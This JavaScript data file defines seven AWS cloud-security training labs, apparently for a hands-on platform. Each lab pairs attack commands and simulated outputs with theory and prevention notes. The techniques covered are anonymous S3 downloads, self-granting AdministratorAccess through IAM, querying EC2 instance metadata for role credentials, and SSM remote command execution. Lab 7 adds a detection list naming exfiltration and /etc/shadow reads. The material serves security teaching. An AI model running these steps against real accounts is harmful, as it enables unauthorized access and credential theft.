export const labData = {
  'lab-1-s3': {
    title: 'Lab 1: The Leaky S3 Bucket',
    description: 'Discover and exploit a publicly accessible S3 bucket with sensitive data',
    steps: [
      {
        title: 'Configure AWS CLI',
        description: 'Set up the AWS CLI with the provided credentials',
        commands: ['aws configure'],
        expectedOutput:
          'AWS CLI configured successfully\nAWS Access Key ID: ***\nAWS Secret Access Key: ***\nDefault region name: us-east-1\nDefault output format: json',
      },
      {
        title: 'List S3 Bucket Contents',
        description:
          'List the contents of the vulnerable bucket without authentication',
        commands: ['aws s3 ls s3://my-company-secrets-2025 --no-sign-request'],
        expectedOutput:
          '2025-08-30 14:22:05        128 financial-records.txt\n2025-08-30 14:22:06       256 config.json\n2025-08-30 14:22:07       512 database-backup.sql',
      },
      {
        title: 'Download Sensitive File',
        description: 'Download the financial records file anonymously',
        commands: [
          'aws s3 cp s3://my-company-secrets-2025/financial-records.txt . --no-sign-request',
        ],
        expectedOutput: 'download: s3://my-company-secrets-2025/financial-records.txt to ./financial-records.txt',
      },
      {
        title: 'View the Stolen Data',
        description: 'Display the contents of the sensitive file',
        commands: ['cat financial-records.txt'],
        expectedOutput:
          'Top Secret: Q3 Financial Report\nRevenue: $5,200,000\nProfit: $1,000,000\nExpenses: $4,200,000',
      },
    ],
    theory: `S3 BUCKET SECURITY CONCEPTS:

VULNERABILITY EXPLAINED:
- The bucket had "Block Public Access" disabled
- A bucket policy allowed "Principal": "*" to perform s3:GetObject
- This combination exposed all files in the bucket to the internet

ROOT CAUSE ANALYSIS:
1. Developer turned off critical security guards
2. Applied overly permissive bucket policy
3. Accidentally exposed sensitive financial data
4. No encryption on the bucket

THE ATTACK:
- Attacker discovers the bucket name
- Uses --no-sign-request to bypass authentication
- Downloads all sensitive files
- Extracts confidential business information

PREVENTION:
1. Enable "Block All Public Access" by default
2. Use principle of least privilege
3. Use CloudFront for public content
4. Enable versioning and logging
5. Use AWS IAM Access Analyzer to audit
6. Encrypt sensitive data with KMS`,
  },

  'lab-2-iam': {
    title: 'Lab 2: IAM Privilege Escalation',
    description:
      'Start with low privileges and exploit misconfigured IAM to become admin',
    steps: [
      {
        title: 'Setup Vulnerable User',
        description: 'Configure CLI with low-privilege user credentials',
        commands: ['aws configure'],
        expectedOutput:
          'AWS CLI configured for vulnerable-user\nAWS Access Key ID: ***\nAWS Secret Access Key: ***',
      },
      {
        title: 'Verify Limited Access',
        description: 'Test that your current user has minimal permissions',
        commands: ['aws iam list-users'],
        expectedOutput: 'An error occurred (AccessDenied) when calling the ListUsers operation',
      },
      {
        title: 'Enumerate Attached Policies',
        description: 'List the policies attached to your user',
        commands: ['aws iam list-attached-user-policies --user-name vulnerable-user'],
        expectedOutput:
          'PolicyName: PotentialEscalationPolicy\nPolicyArn: arn:aws:iam::123456789012:policy/PotentialEscalationPolicy',
      },
      {
        title: 'Examine Policy Details',
        description: 'Get the policy document to find the privilege escalation vector',
        commands: [
          'aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/PotentialEscalationPolicy --version-id v1',
        ],
        expectedOutput:
          '{\n  "Statement": [\n    {\n      "Effect": "Allow",\n      "Action": "iam:AttachUserPolicy",\n      "Resource": "arn:aws:iam::*:user/${"${aws:username}"}"  \n    }\n  ]\n}',
      },
      {
        title: 'Escalate to Admin',
        description: 'Attach the AdministratorAccess policy to yourself',
        commands: [
          'aws iam attach-user-policy --user-name vulnerable-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess',
        ],
        expectedOutput: 'Successfully attached AdministratorAccess policy to vulnerable-user',
      },
      {
        title: 'Verify Full Access',
        description: 'Confirm you now have full administrative permissions',
        commands: ['aws iam list-users'],
        expectedOutput:
          'UserName: admin\nUserName: vulnerable-user\nUserName: monitoring-user\nUserName: developer',
      },
    ],
    theory: `IAM PRIVILEGE ESCALATION CONCEPTS:

VULNERABILITY EXPLAINED:
- The vulnerable-user had iam:AttachUserPolicy permission
- The policy allowed attaching ANY policy to the user (no conditions)
- This created a privilege escalation path to full admin

THE ESCALATION ATTACK:
1. Start with low-privilege user credentials
2. Discover you can attach policies to yourself
3. Attach AdministratorAccess policy
4. Gain full AWS account control

WHY THIS HAPPENED:
- Least privilege was not implemented
- Conditions were not used to restrict which policies could be attached
- Administrator assumed the policy couldn't be exploited

PREVENTION:
1. Use Conditions to restrict AttachUserPolicy actions
2. Only allow attaching specific pre-approved policies
3. Use temporary credentials (roles) instead of long-term keys
4. Enable CloudTrail logging to detect suspicious policy attachments
5. Regular IAM audits with Access Analyzer
6. Use Permission Boundaries to limit maximum permissions

CORRECT POLICY:
{
  "Effect": "Allow",
  "Action": "iam:AttachUserPolicy",
  "Resource": "arn:aws:iam::*:user/${"${aws:username}"}",
  "Condition": {
    "ArnEquals": {
      "iam:PolicyArn": "arn:aws:iam::aws:policy/MyAppKeyRotationPolicy"
    }
  }
}`,
  },

  'lab-3-ec2': {
    title: 'Lab 3: Public EC2 Instance Exploitation',
    description:
      'Exploit misconfigured security groups to gain shell access to an EC2 instance',
    steps: [
      {
        title: 'Secure SSH Key',
        description: 'Set proper permissions on the EC2 key pair file',
        commands: ['chmod 400 lab-key-pair.pem'],
        expectedOutput: 'Key pair permissions updated to 400 (read-only)',
      },
      {
        title: 'Connect via SSH',
        description:
          'Use SSH to connect to the publicly exposed EC2 instance (replace IP with actual)',
        commands: ['ssh -i lab-key-pair.pem ec2-user@54.210.132.101'],
        expectedOutput:
          '[ec2-user@ip-172-31-18-69 ~]$\nWelcome to Amazon Linux 2',
      },
      {
        title: 'Verify System Access',
        description: 'Confirm your shell access and check user privileges',
        commands: ['whoami'],
        expectedOutput: 'ec2-user',
      },
      {
        title: 'Find the Flag',
        description: 'Look for sensitive data or flags in the home directory',
        commands: ['cat /home/ec2-user/flag.txt'],
        expectedOutput: 'FLAG: EC2_SSH_Compromised_Via_Public_IP!',
      },
      {
        title: 'Query Instance Metadata',
        description:
          'Attempt to retrieve IAM credentials from the metadata service (lateral movement)',
        commands: [
          'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        ],
        expectedOutput: 'EC2InstanceRole\nAdditional AWS credentials exposed...',
      },
    ],
    theory: `EC2 SECURITY GROUP EXPLOITATION:

VULNERABILITY EXPLAINED:
- Security Group allowed SSH (port 22) from 0.0.0.0/0 (entire internet)
- EC2 key pair was compromised or leaked
- These two factors combined enabled unauthorized access

THE ATTACK:
1. Discover EC2 public IP through various means (Shodan, AWS scanning)
2. Attempt SSH connection with compromised/leaked private key
3. If Security Group allows SSH from anywhere, you gain access
4. Once inside, escalate privileges and explore metadata service
5. Extract IAM role credentials for lateral movement

ROOT CAUSE:
- Permissive Security Group configuration
- Credential exposure (leaked in GitHub, email, etc)
- No additional authentication or bastion host

POST-EXPLOITATION:
- Query instance metadata service
- Extract temporary IAM credentials
- Use credentials to compromise other AWS resources
- Pivot to databases, S3 buckets, other instances

PREVENTION:
1. Restrict SSH to specific IP addresses/VPN
2. NEVER allow 0.0.0.0/0 for management ports (22, 3389)
3. Use AWS Systems Manager Session Manager (no SSH needed)
4. Store private keys in AWS Secrets Manager
5. Rotate SSH keys regularly
6. Enable VPC Flow Logs to detect suspicious connections
7. Use Bastion Hosts in private subnet architecture
8. Implement IMDSv2 to prevent metadata exposure
9. Enable EC2 Instance Metadata Service V2 (IMDSv2)

SECURE SECURITY GROUP:
Port 22: Restricted to corporate VPN CIDR only
Port 443: HTTPS from specific security groups
All other: Deny by default`,
  },

  'lab-4-lambda': {
    title: 'Lab 4: Lambda Function Data Exposure',
    description:
      'Discover and invoke a Lambda function with excessive permissions that leaks sensitive data',
    steps: [
      {
        title: 'List Lambda Functions',
        description: 'Enumerate available Lambda functions in the region',
        commands: ['aws lambda list-functions'],
        expectedOutput:
          'FunctionName: DataProcessorFunction\nRuntime: python3.11\nRole: arn:aws:iam::123456789012:role/LambdaProcessorRole',
      },
      {
        title: 'Examine Function Configuration',
        description: 'Get detailed configuration and role information',
        commands: ['aws lambda get-function --function-name DataProcessorFunction'],
        expectedOutput:
          'FunctionName: DataProcessorFunction\nCodeSize: 2048\nRole: arn:aws:iam::123456789012:role/LambdaProcessorRole',
      },
      {
        title: 'Invoke Function',
        description: 'Call the Lambda function to see what data it returns',
        commands: [
          'aws lambda invoke --function-name DataProcessorFunction response.json',
        ],
        expectedOutput: 'FunctionArn: arn:aws:lambda:us-east-1:123456789012:function:DataProcessorFunction',
      },
      {
        title: 'Examine Response',
        description: 'View the leaked data from the function response',
        commands: ['cat response.json'],
        expectedOutput:
          '{"statusCode": 200, "body": "DB Connection: host=internal-db.example.com;password=TopSecretPassword123!"}',
      },
      {
        title: 'Check Role Permissions',
        description:
          'Examine the execution role to understand the function\'s capabilities',
        commands: [
          'aws iam list-attached-role-policies --role-name LambdaProcessorRole',
        ],
        expectedOutput:
          'PolicyName: AmazonDynamoDBFullAccess\nPolicyName: AmazonS3FullAccess',
      },
    ],
    theory: `LAMBDA SECURITY VULNERABILITIES:

VULNERABILITY EXPLAINED:
- Lambda function code returns sensitive information (DB credentials)
- Execution role has over-permissive policies (full access to DynamoDB, S3)
- No proper error handling or data filtering
- Secrets exposed in function code or responses

THE ATTACK:
1. Enumerate Lambda functions with list-functions
2. Invoke function to see what it returns
3. Observe leaked credentials in response
4. Examine role to understand what function can access
5. Use those permissions for further exploitation

ROOT CAUSES:
- Hardcoded secrets in function code
- Over-permissive IAM role (principle of least privilege violated)
- Poor security practices in code (no filtering of sensitive data)
- No use of AWS Secrets Manager or Parameter Store

EXPLOITATION PATH:
- Get DB credentials from function response
- Connect to internal database
- Access application data
- Escalate to other AWS resources using role permissions

PREVENTION:
1. Never hardcode secrets - use AWS Secrets Manager
2. Use least privilege policies - only needed permissions
3. Implement proper input validation and error handling
4. Don't return raw sensitive data in responses
5. Use environment variables for non-sensitive config
6. Enable X-Ray tracing for security monitoring
7. Regularly audit function code and permissions
8. Use reserved concurrency to prevent abuse
9. Enable VPC for database access (no internet exposure)

CORRECT APPROACH:
- Store credentials in AWS Secrets Manager
- Use IAM role that only allows needed DynamoDB queries
- Return only processed data, never raw credentials
- Implement proper error handling
- Log security events with CloudTrail

EXAMPLE SECURE POLICY:
{
  "Effect": "Allow",
  "Action": [
    "dynamodb:Query",
    "dynamodb:GetItem"
  ],
  "Resource": "arn:aws:dynamodb:us-east-1:123456789012:table/ProductsTable"
}`,
  },

  'lab-5-dynamodb': {
    title: 'Lab 5: DynamoDB Exploitation',
    description: 'Exploit misconfigured DynamoDB tables and IAM permissions',
    steps: [
      {
        title: 'List DynamoDB Tables',
        description: 'Enumerate available DynamoDB tables',
        commands: ['aws dynamodb list-tables'],
        expectedOutput:
          'Tables:\n  - CompanySecretsTable\n  - UsersTable\n  - OrdersTable\n  - FinancialDataTable',
      },
      {
        title: 'Examine Table Access',
        description: 'Get detailed information about a table',
        commands: ['aws dynamodb describe-table --table-name CompanySecretsTable'],
        expectedOutput:
          'TableName: CompanySecretsTable\nItemCount: 1500\nTableSizeBytes: 2048000',
      },
      {
        title: 'Scan Table Data',
        description: 'Read all items from the vulnerable table',
        commands: ['aws dynamodb scan --table-name CompanySecretsTable'],
        expectedOutput:
          'Count: 100\nItems: [\n  {id: "123", secret: "API_KEY_12345"},\n  {id: "124", secret: "DB_PASSWORD_xyz"}\n]',
      },
      {
        title: 'Query Specific Data',
        description: 'Use query to find specific sensitive records',
        commands: [
          'aws dynamodb query --table-name CompanySecretsTable --key-condition-expression "id = :id" --expression-attribute-values "{:id: {S: "admin"}}"',
        ],
        expectedOutput:
          'Items: [\n  {id: "admin", password: "SuperSecretPassword123!"}\n]',
      },
    ],
    theory: `DYNAMODB SECURITY ISSUES:

VULNERABILITY EXPLAINED:
- DynamoDB tables are readable without proper access controls
- IAM role allows all DynamoDB operations
- No encryption or data masking
- Sensitive data stored without additional protection

THE ATTACK:
1. List available DynamoDB tables
2. Scan tables to retrieve all data
3. Query specific items using known keys
4. Extract sensitive information like passwords, API keys
5. Export data for offline analysis

ROOT CAUSES:
- Over-permissive IAM policy allowing full DynamoDB access
- No RLS (Row Level Security) equivalent in DynamoDB
- Sensitive data stored unencrypted
- No additional authentication beyond IAM

PREVENTION:
1. Use least privilege IAM policies
2. Limit operations: Query/GetItem instead of Scan
3. Enable DynamoDB Streams for audit logging
4. Use DynamoDB encryption at rest (KMS)
5. Enable CloudTrail for API monitoring
6. Use point-in-time recovery for backups
7. Implement application-level encryption for sensitive fields
8. Use VPC endpoints to restrict access
9. Regular access audits and reviews
10. Implement rate limiting and alarms

EXAMPLE SECURE POLICY:
{
  "Effect": "Allow",
  "Action": [
    "dynamodb:GetItem",
    "dynamodb:Query"
  ],
  "Resource": "arn:aws:dynamodb:us-east-1:123456789012:table/ProductsTable",
  "Condition": {
    "StringEquals": {
      "dynamodb:LeadingKeys": ["${"${aws:username}"}"]
    }
  }
}`,
  },

  'lab-6-cloudtrail': {
    title: 'Lab 6: CloudTrail Investigation',
    description:
      'Detect and investigate AWS API activity using CloudTrail logs',
    steps: [
      {
        title: 'Enable CloudTrail',
        description: 'Create a CloudTrail to log API activity',
        commands: [
          'aws cloudtrail create-trail --name SecurityTrail --s3-bucket-name security-logs',
        ],
        expectedOutput:
          'TrailARN: arn:aws:cloudtrail:us-east-1:123456789012:trail/SecurityTrail\nS3BucketName: security-logs',
      },
      {
        title: 'Start Logging',
        description: 'Start the CloudTrail logging',
        commands: ['aws cloudtrail start-logging --trail-name SecurityTrail'],
        expectedOutput: 'Logging started for trail: SecurityTrail',
      },
      {
        title: 'List CloudTrail Events',
        description: 'Retrieve recent API activity events',
        commands: ['aws cloudtrail lookup-events --trail-name SecurityTrail --max-results 10'],
        expectedOutput:
          'Events:\n  - EventName: AttachUserPolicy\n    EventTime: 2025-01-28T10:30:00Z\n    UserName: vulnerable-user\n  - EventName: PutObject\n    EventTime: 2025-01-28T10:25:00Z\n    UserName: ec2-user',
      },
      {
        title: 'Filter Suspicious Activity',
        description:
          'Find all instances of privilege escalation attempts',
        commands: [
          'aws cloudtrail lookup-events --trail-name SecurityTrail --lookup-attributes AttributeKey=EventName,AttributeValue=AttachUserPolicy',
        ],
        expectedOutput:
          'Events:\n  - EventTime: 2025-01-28T10:30:00Z\n    UserName: vulnerable-user\n    SourceIP: 203.0.113.45\n    EventName: AttachUserPolicy\n    RequestParameters: {policyArn: "arn:aws:iam::aws:policy/AdministratorAccess"}',
      },
    ],
    theory: `CLOUDTRAIL MONITORING & DETECTION:

WHAT IS CLOUDTRAIL:
- AWS CloudTrail logs all API calls made in AWS
- Provides audit trail of actions taken by users, roles, services
- Essential for security monitoring and forensics

VULNERABILITY DETECTION:
- Unusual API calls (escalation attempts)
- Bulk data access (S3 scan, DynamoDB scan)
- Failed authentication attempts
- Resource creation/deletion by unexpected users
- Permission changes and policy attachments

KEY EVENTS TO MONITOR:
- AttachUserPolicy / AttachRolePolicy - privilege escalation risk
- PutBucketPolicy / PutBucketAcl - S3 permission changes
- AuthorizeSecurityGroupIngress - firewall rule changes
- CreateAccessKey / CreateUser - account compromise
- DeleteTrail - attacker destroying evidence
- ModifyDBInstance - database tampering
- PutObject / DeleteObject - suspicious S3 activity

THE INVESTIGATION:
1. Enable CloudTrail in all regions
2. Store logs in protected S3 bucket
3. Monitor and alert on suspicious events
4. Query events by user, resource, or action
5. Correlate events to identify attack patterns
6. Archive logs for long-term retention

PREVENTION & DETECTION:
1. Enable CloudTrail in all AWS regions
2. Use CloudTrail Insights for anomaly detection
3. Forward logs to SIEM (CloudWatch, Splunk, etc)
4. Set up alerts for critical events
5. Regular log analysis and reviews
6. Archive logs to S3 with versioning and MFA delete
7. Use Organizations to centralize CloudTrail
8. Enable log file validation
9. Integrate with EventBridge for automated responses
10. Monitor for DisableLogging events

EVENTS TO ALERT ON:
- AttachUserPolicy (privilege escalation)
- PutBucketPolicy with "Principal": "*" (public exposure)
- AuthorizeSecurityGroupIngress with 0.0.0.0/0
- DeleteTrail (destroying audit logs)
- ModifyDBInstance (database tampering)
- CreateAccessKey by unexpected users

RESPONSE ACTIONS:
1. Identify affected resources immediately
2. Revoke compromised credentials
3. Review all activity by attacker
4. Restore from backups if needed
5. Implement controls to prevent recurrence`,
  },

  'lab-7-ssm': {
    title: 'Lab 7: Systems Manager Exploitation',
    description: 'Leverage AWS Systems Manager for lateral movement and privilege escalation',
    steps: [
      {
        title: 'List SSM Documents',
        description:
          'Enumerate available Systems Manager documents that can be executed',
        commands: ['aws ssm list-documents --filters "Key=DocumentType,Value=Command"'],
        expectedOutput:
          'DocumentDescriptions:\n  - Name: AWS-RunShellScript\n  - Name: AWS-RunPatchBaseline\n  - Name: CustomPrivilegeEscalation',
      },
      {
        title: 'Find Vulnerable EC2 Instances',
        description:
          'List EC2 instances that have SSM agent and IAM role enabled',
        commands: ['aws ssm describe-instance-information --query "InstanceInformationList[*]"'],
        expectedOutput:
          'InstanceInformationList:\n  - InstanceId: i-0123456789abcdef0\n    InstanceStatus: Online\n    ComputerName: Production-Server-01',
      },
      {
        title: 'Execute Command on Instance',
        description:
          'Run a command on the EC2 instance via Session Manager (lateral movement)',
        commands: [
          'aws ssm send-command --instance-ids "i-0123456789abcdef0" --document-name "AWS-RunShellScript" --parameters \'{"command":["id"]}\'',
        ],
        expectedOutput:
          'CommandId: 1c87ec54-ec91-4ac5-b4b8-a0151EXAMPLE\nInstanceId: i-0123456789abcdef0\nStatus: Success\nOutput: uid=0(root) gid=0(root) groups=0(root)',
      },
      {
        title: 'Start Interactive Session',
        description: 'Establish an interactive session to the compromised instance',
        commands: ['aws ssm start-session --target "i-0123456789abcdef0"'],
        expectedOutput:
          'Starting session with instance i-0123456789abcdef0\n[ec2-user@production-server-01 ~]$',
      },
      {
        title: 'Escalate Privileges',
        description:
          'Use the session to escalate privileges and extract credentials',
        commands: ['sudo -l'],
        expectedOutput:
          'User ec2-user may run the following without password:\n  (ALL) NOPASSWD: ALL\nUser has full sudo access!',
      },
    ],
    theory: `SYSTEMS MANAGER SECURITY RISKS:

WHAT IS SSM SESSION MANAGER:
- AWS Systems Manager Session Manager provides shell access to instances
- No need for SSH keys or open security groups
- Uses IAM for authentication and authorization
- Connections are logged to CloudTrail and CloudWatch

VULNERABILITY EXPLAINED:
- EC2 instance has overly permissive IAM role
- Security group doesn't restrict SSM access
- Instance has SSM agent installed (enabled by default in some cases)
- No monitoring of SSM session activity

THE ATTACK:
1. Compromise initial AWS credentials (from any source)
2. Check if compromised user has EC2FullAccess or specific SSM permissions
3. List available EC2 instances that SSM can reach
4. Use Session Manager to execute commands
5. Run privileged commands (sudo) if permissions allow
6. Extract credentials and data from inside the instance
7. Move laterally to other instances or AWS services

LATERAL MOVEMENT PATH:
- EC2 Instance -> Extract instance metadata -> Get IAM role credentials
- Use new credentials to access other resources
- Compromise RDS/DynamoDB/S3/Lambda
- Continue escalation through the AWS environment

ROOT CAUSES:
- Overly permissive EC2 IAM roles (FullAccess policies)
- Lack of monitoring on SSM activity
- Poor instance hardening (sudo without password)
- No detection of unusual command execution
- Credentials left accessible in memory or files

PREVENTION & DETECTION:
1. Use least privilege IAM roles for EC2
2. Enable Systems Manager Session Manager logging to CloudWatch
3. Monitor ssm:StartSession events in CloudTrail
4. Implement script whitelisting on instances
5. Use CloudWatch Logs Insights to detect suspicious commands
6. Require MFA for SSM session initiation
7. Restrict SSM command documents
8. Monitor for privilege escalation attempts (sudo commands)
9. Implement OS-level security controls
10. Regular security audits of instance IAM roles

EXAMPLE SECURE IAM POLICY:
{
  "Effect": "Allow",
  "Action": [
    "ssm:StartSession"
  ],
  "Resource": "arn:aws:ec2:us-east-1:123456789012:instance/*",
  "Condition": {
    "StringEquals": {
      "aws:RequestedRegion": "us-east-1"
    }
  }
}

SUSPICIOUS COMMANDS TO ALERT ON:
- sudo -l or sudo su (privilege escalation check)
- export AWS_* (credential exfiltration)
- wget/curl with exfil URLs
- cat /etc/passwd or /etc/shadow
- aws configure or aws sts get-caller-identity
- ss -tulpn or netstat (network reconnaissance)`,
  },
};
